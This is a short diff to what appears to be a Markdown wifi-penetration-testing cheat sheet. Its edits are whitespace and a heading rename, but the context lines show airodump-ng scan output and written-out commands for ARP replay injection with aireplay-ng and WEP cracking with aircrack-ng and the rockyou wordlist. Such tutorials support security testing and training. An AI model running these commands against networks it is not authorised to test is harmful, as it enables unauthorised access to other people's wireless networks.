@@ -26,11 +26,10 @@ CH 128 ][ Elapsed: 42 s ][ 2024-11-11 15:13
 
  F0:9F:C2:71:22:1A  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp         
  F0:9F:C2:7A:33:28  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-regional-tabl
- F0:9F:C2:71:22:15  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp         
-
+ F0:9F:C2:71:22:15  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp
 
 ```
-## CHOOSE FOR THE RESPECTIVE AUTH
+## CHOOSE FOR THE RESPECTIVE AUTHENTICATION METHODS
 ### 3a. If AUTH is **WEP**
 #### Theory
 ```
@@ -57,7 +56,6 @@ root@kali:~# aireplay-ng -3 -b <AP_BSSID> -h <Station_BSSID> <Interface>
 e.g.
 root@kali:~# aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 3A:2E:A2:2B:48:22 wlan0mon
 
-​
 # 3. At the folder where the command is run there is a .cap file. Crack the WEP handshake captured in the file
 root@kali:~# aircrack-ng <File_Name> -w /usr/share/wordlists/rockyou.txt
 
